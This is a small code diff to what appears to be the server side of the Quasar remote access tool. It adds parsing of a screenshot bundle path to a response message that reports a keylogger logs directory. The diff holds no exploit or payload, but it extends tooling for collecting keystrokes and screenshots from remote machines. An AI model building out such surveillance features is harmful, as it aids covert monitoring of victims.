@@ -730,6 +730,7 @@ namespace Quasar.Server.Networking
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
             if (subtype != 50) return false;
             string logsDir = "";
+            string screenshotBundlePath = "";
             while (offset < end)
             {
                 if (!TryReadVarint(payload, ref offset, end, out int tag)) break;
@@ -738,9 +739,10 @@ namespace Quasar.Server.Networking
                 if (wire != 2) break;
                 if (!TryReadVarint(payload, ref offset, end, out int len) || offset + len > end) break;
                 if (field == 1) logsDir = Encoding.UTF8.GetString(payload, offset, len);
+                else if (field == 2) screenshotBundlePath = Encoding.UTF8.GetString(payload, offset, len);
                 offset += len;
             }
-            result = new GetKeyloggerLogsDirectoryResponse { LogsDirectory = logsDir ?? "" };
+            result = new GetKeyloggerLogsDirectoryResponse { LogsDirectory = logsDir ?? "", ScreenshotBundlePath = screenshotBundlePath ?? "" };
             return true;
         }
 
